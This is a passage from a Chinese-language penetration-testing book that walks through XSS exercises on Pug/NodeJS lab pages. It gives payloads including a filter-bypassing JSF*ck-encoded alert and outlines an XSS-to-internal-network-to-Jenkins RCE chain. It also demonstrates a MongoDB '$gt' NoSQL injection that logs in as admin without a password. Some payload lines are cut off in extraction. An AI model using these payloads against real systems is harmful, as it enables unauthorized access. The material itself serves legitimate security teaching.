第3章 抛传——Web 应用程序漏洞利用
点击提交后，我们应该看到弹出窗口。你可以通过查看页面源代码并搜索“alert”进行验
证。
因此，使用未提交用户输入的非转义字符串插值（ ）会导致很多麻烦。这是一种不
!{name2}
好的做法，不应该用于用户提交的数据。因为我们输入的任何 JavaScript 都将在受害者的浏
览器上执行。
练习3
这个例子中，我们在动态生成的行内 JavaScript 中加入了转义后的字符串。这意味着我们成
功了，因为它已经隐藏了，不是吗？由于我们所处的代码上下文，这个例子很容易受到攻
击。我们将在 Pug 模板中看到，在我们的转义插值之前，我们实际上是在一个 script 标签
内。因此，任何 JavaScript 都会自动执行。更棒的是，因为我们位于 Script 标签内，所以我
们不需要将  标签用作 payload 的一部分。我们可以使用直接的 JavaScript 代码，
例如：alert(1)：
打开练习3
Pug 模板源代码
script.
var user3 = #{name3};
p No results found for #{name3}
此模板将在 HTML 中进行转义，如下所示：
No results found for [escaped user input]
74
第3章 抛传——Web 应用程序漏洞利用
尝试输入 payload：
1;alert(1);
点击提交后，我们应该看到弹出窗口。你可以通过查看页面源代码并搜索“alert”进行验
证。
顺便说一句，下面是一个小小的改变，正确的方法是在插值周围添加引号：
Pug 模板源代码
script.
var user3="#{name3}"
练习4
在这个例子中，我们有 Pug 非转义代码，由 != 表示，因为没有转义，所以它很容易受到
XSS 的攻击。因此，在这种情况下，我们可以对输入字段使用简单的 
Pug 模板源代码：
p != 'No results found for '+name4
尝试输入 payload：
点击提交后，我们应该看到弹出窗口。你可以通过查看页面源代码并搜索“alert”进行验
证。
练习5
假设我们得到一个使用转义字符串插值和某种类型的过滤的应用程序。在下面的练习中，我
们在 NodeJS 服务器中执行规则最小的黑名单过滤脚本，删除“”和“alert”等字符。但
是，他们再次错误地将我们的转义字符串插值放在 script 标签中。如果我们可以在那里利用
JavaScript，我们就可以发现一个 XSS：
打开练习5
Pug 模板源代码
name5 = req.query.name5.replace(/[;’"<>=]|alert/g,"")
script.
var user3 = #{name5};
尝试输入 payload
你可以尝试 alert(1)，但由于过滤器不起作用。你也可以尝试像
用 alert(1)的 payload，我们该怎么办？
我们需要弄清楚如何绕过过滤器来插入原始 JavaScript。请记住，JavaScript 功能非常强
大，并且具有许多功能。我们可以利用此功能来提供一些新颖的 payload。绕过这些过滤
器的一种方法是使用新颖的 JavaScript 表示方法。这可以通过名为
http://www.jsfuck.com/ 的站点创建。如下所示，通过使用括号，括号，加号和感叹号，
75
第3章 抛传——Web 应用程序漏洞利用
我们可以重新创建 alert(1)。
JSF*ck Payload：
[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!
![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[
+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]
]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])
[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]
]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([]
[[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!
![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]
+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(
!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[
+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!
+[]]+(!![]+[])[+[]]+(![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[
]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]
]]+[+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+
(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]])()
如你所知，许多浏览器已开始包含 XSS 保护机制。我们甚至可以使用这些 payload 来绕过某
些浏览器保护。尝试在 Kali 之外的真实浏览器中使用它们，例如 Chrome。
在复杂的应用程序上触发 XSS 并不容易。很容易忽视或误解框架如何处理输入和输出。因
此，在为 Pug/NodeJS 应用程序执行源代码审查时，在源代码中搜索 !{ ， #{ 或 ${ 有助
于可能触发 XSS 的位置。了解上下文，以及是否需要在该上下文中进行转义，这是至关重要
的，我们将在以下示例中看到。
尽管这些攻击特定于 Node 和 Pug，但每种语言都存在针对 XSS 和输入验证的问题。你将无
法运行漏洞扫描程序或 XSS 模糊测试工具并找到所有 XSS 漏洞。但你确实需要了解所使用
的语言和框架。
76
第3章 抛传——Web 应用程序漏洞利用
从 XSS 到 shell
我经常遇到的一个问题是，我如何通过 XSS 获取 Shell？尽管有许多不同的方法可以做到这
一点，但我们通常会发现，如果我们可以让用户在内容管理系统（CMS）或类似系统中获得
管理员的 XSS，那么这可能会导致系统完全受损。可以在这里找到 Hans-Michael 完整的演
练示例和代码：https://github.com/Varbaek/xsser 。 Hans-Michael 提供了一些关于重建 XSS
到 RCE 攻击的精彩示例和视频。
我喜欢使用涉及利用 JavaScript 功能的自定义红队攻击。我们知道 JavaScript 非常强大，我
们在 BeEF（浏览器开发框架）中看到过这样的功能。因此，我们可以利用所有这些功能来执
行受害者不知情的攻击。这个 payload 会做些什么？攻击的一个示例是让受害者计算机上运
行的 JavaScript XSS payload 获取受害者的内部（自然）IP 地址。然后，我们可以获取其 IP
地址并开始使用我们的 payload 扫描其内部网络。如果我们发现一个允许在没有身份验证的
情况下就可以登入的 Web 应用程序，我们就可以向该服务器发送 payload。
例如，我们的目标可能是 Jenkins 服务器，我们知道如果可以未经身份验证登录的话，几乎
可以完成远程代码执行。要查看 XSS 与 Jenkins 入侵的完整演练，请参阅第5章 - 利用社会
工程攻击内网 Jenkins。
NoSQL 注入
在前两本书中，我们花了相当多的时间学习如何进行 SQL 注入和使用 SQLMap。除了对
Burp Suite 的一些混淆和集成之外，本书对比上本书没有太大变化。相反，我想深入研究
NoSQL 注入，因为这些数据库变得越来越普遍。
MySQL，MSSQL 和 Oracle 等传统 SQL 数据库依赖于关系数据库中的结构化数据。这些数
据库是关系型的，这意味着一个表中的数据与其他表中的数据有关。这样可以轻松执行查
询，例如“列出所有在过去30天内购买东西的客户”。对这些数据的要求是，数据的格式必须在
整个数据库中保持一致。NoSQL 数据库由通常不遵循表格/关系模型的数据组成，如 SQL 查
询数据库中所示。这些称为“非结构化数据”（如图片，视频，社交媒体）的数据并不适用于我
们的大量收集数据。
NoSQL 功能：
NoSQL 数据库的类型：Couch/MongoDB
非结构化数据
水平化增长
在传统的 SQL 注入中，攻击者会尝试破坏 SQL 查询语句并在服务器端修改查询语句。使用
NoSQL 注入，攻击可以在应用程序的其他区域中执行，而不是在传统的 SQL 注入中执行。
此外，在传统的 SQL 注入中，攻击者会使用一个标记来发起攻击。在 NoSQL 注入中，在
NoSQL注入中，通常存在将字符串解析或评估为NoSQL调用的漏洞。
77
第3章 抛传——Web 应用程序漏洞利用
NoSQL 注入中的漏洞通常在以下情况下发生：（1）端点接受的 JSON 数据是从 NoSQL 数
据库中请求的，以及（2）我们能够使用 NoSQL 比较运算符操作查询来更改 NoSQL 查询。
NoSQL 注入的一个常见例子是注入类似的东西： [{"$gt":""}] 。这个 JSON 对象基本上是
说运算符（ $gt ）大于 NULL("")。由于逻辑上一切都大于 NULL，因此 JSON 对象成为一个
真正正确的语句，允许我们绕过或注入 NoSQL 查询。这相当于 SQL 注入世界中的[' or 1=1
—]。在 MongoDB 中，我们可以使用以下条件运算符之一：
(>)大于 - $gt
(=)大于等于 - $gte
(
{"username"："admin"，"password"：{"$gt"：""}}
你现在应该可以以管理员身份登录！
那么这里发生了什么呢？我们将字符串 "GuessingAdminPassword" 更改为JSON对象
{"$gt":""} ，这是 TRUE 语句，因为大于 NULL 的所有内容都为 TRUE。这将 POST 请求
更改为 {"username":"admin", "password":TRUE } ，它自动使请求为 TRUE 并以管理员身份登
录而不需要知道密码，类似 SQLi 中的 1 = 1 攻击。